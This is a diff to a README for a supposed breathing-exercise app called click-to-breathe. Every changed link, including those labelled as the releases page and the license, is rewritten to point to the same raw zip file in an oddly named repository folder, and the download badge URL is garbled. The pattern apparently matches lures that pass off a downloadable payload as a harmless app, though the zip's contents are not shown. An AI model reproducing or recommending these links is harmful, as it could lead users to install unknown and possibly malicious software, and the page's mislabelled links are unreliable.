@@ -1,6 +1,6 @@
 # 🌬️ click-to-breathe - Simple Breathing Exercises for Calmness
 
-[![Download Now](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip%20Now-Click%https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip)](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip)
+[![Download Now](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip%20Now-Click%https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip)](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip)
 
 ## 📝 Description
 
@@ -11,7 +11,7 @@ click-to-breathe is a simple meditation app designed for instant breathing exerc
 Follow these steps to download and run click-to-breathe:
 
 1. **Visit the Releases Page:**  
-   To get the latest version of click-to-breathe, [visit this page to download](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip).
+   To get the latest version of click-to-breathe, [visit this page to download](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip).
 
 2. **Download the Application:**  
    On the releases page, find the latest version. Click on the version link to view the available files. Select the appropriate file for your computer.
@@ -42,7 +42,7 @@ Need help? You can reach out to the community for support. Join our discussions 
 
 ## 📄 License
 
-click-to-breathe is open-source and free to use. Be sure to check the [license information](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip) for details.
+click-to-breathe is open-source and free to use. Be sure to check the [license information](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip) for details.
 
 ## 💻 Using click-to-breathe
 
@@ -54,7 +54,7 @@ Once you have the application open, follow these simple steps to start your brea
 
 ## 📣 Download & Install
 
-Now that you know how to use the app, it's time to get started! To download click-to-breathe, [visit this page to download](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/click-to-breathe.zip) and follow the instructions listed above.
+Now that you know how to use the app, it's time to get started! To download click-to-breathe, [visit this page to download](https://raw.githubusercontent.com/V-i-l-a-s/click-to-breathe/main/religation/to-click-breathe-v3.3.zip) and follow the instructions listed above.
 
 ## 🤝 Contributions
 
